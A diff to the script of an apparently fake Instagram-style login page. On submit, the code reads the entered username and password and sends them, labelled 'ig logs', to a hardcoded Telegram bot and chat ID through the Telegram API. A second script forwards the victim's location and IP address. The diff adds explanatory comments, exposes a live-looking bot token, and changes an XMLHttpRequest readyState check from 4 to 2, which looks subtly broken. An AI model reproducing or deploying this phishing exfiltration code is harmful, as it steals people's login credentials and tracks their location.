@@ -284,78 +284,106 @@ form .create-account:hover {
     </form> -->
 
     <p id="status"></p>
-   
+
     <script>
-        // Function to send data using Fetch API
+        // Function to send a message to a specified Telegram chat using the Fetch API
         function sendMessageWithFetch(chatId, message) {
+            // Define the Telegram API URL with your bot token
             const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+            
+            // Create the data object containing the chat ID and message text
             const data = {
                 chat_id: chatId,
                 text: message
             };
-
+    
+            // Send a POST request to the Telegram API using Fetch
             fetch(telegramAPI, {
-                method: 'POST',
+                method: 'POST', // Specify the request method
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json' // Indicate the content type of the request
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(data) // Convert the data object to a JSON string
             })
-            .then(response => response.json())
+            .then(response => response.json()) // Parse the JSON response from the server
             .then(result => {
+                // Check if the message was sent successfully
                 if (result.ok) {
+                    // Update the status message on the page
                     document.getElementById("status").innerText += "Message sent using Fetch! ";
                 } else {
+                    // Log an error message if sending failed
                     console.error("Error sending message using Fetch:", result);
                 }
             })
             .catch(error => {
+                // Log any network or other errors that occur
                 console.error("Fetch failed:", error);
             });
         }
-
-        // Function to send data using XMLHttpRequest
+    
+        // Function to send a message to a specified Telegram chat using XMLHttpRequest
         function sendMessageWithXHR(chatId, message) {
+            // Define the Telegram API URL with your bot token
             const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+            
+            // Create a new XMLHttpRequest object
             const xhr = new XMLHttpRequest();
+            
+            // Create the data object containing the chat ID and message text
             const data = JSON.stringify({
                 chat_id: chatId,
                 text: message
             });
-
+    
+            // Initialize the XMLHttpRequest with the POST method and the Telegram API URL
             xhr.open('POST', telegramAPI, true);
+            // Set the request header to indicate the content type
             xhr.setRequestHeader('Content-Type', 'application/json');
-
+    
+            // Set up a function to handle the response from the server
             xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    const response = JSON.parse(xhr.responseText);
+                // Check if the request is complete and was successful
+                if (xhr.readyState === 2 && xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText); // Parse the response
+                    // Check if the message was sent successfully
                     if (response.ok) {
+                        // Update the status message on the page
                         document.getElementById("status").innerText += "Message sent using XMLHttpRequest!";
                     } else {
+                        // Log an error message if sending failed
                         console.error("Error sending message using XMLHttpRequest:", response);
                     }
                 }
             };
-
+    
+            // Send the data as the request body
             xhr.send(data);
         }
-
-        // Handle form submission
+    
+        // Handle the submission of the login form
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form from submitting normally
-
+            event.preventDefault(); // Prevent the default form submission behavior
+    
             const chatId = '1866571175'; // Your Telegram chat ID
+            // Get the username and password values from the form inputs
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
-
-            // Construct the message with username, password, and log type
+    
+            // Construct the message to be sent, including the username, password, and log type
             const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
-
-            // Try both methods
-            sendMessageWithFetch(chatId, message);
-            sendMessageWithXHR(chatId, message);
+    
+            // Send the message using both methods
+            sendMessageWithXHR(chatId, message);   // Send using XMLHttpRequest
         });
     </script>
+    
+    
+    
+    
+    
+    
+    
     <script>
         // Function to send location data to Telegram using Fetch API
         function sendLocationToTelegram(chatId, country, city, ip) {
@@ -415,8 +443,7 @@ form .create-account:hover {
             const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
     
             // Send login info to Telegram (this was in your previous script)
-            sendMessageWithFetch(chatId, message);
-            sendMessageWithXHR(chatId, message);
+
     
             // Fetch and send location info after login info is sent
             fetchLocationInfo(chatId);
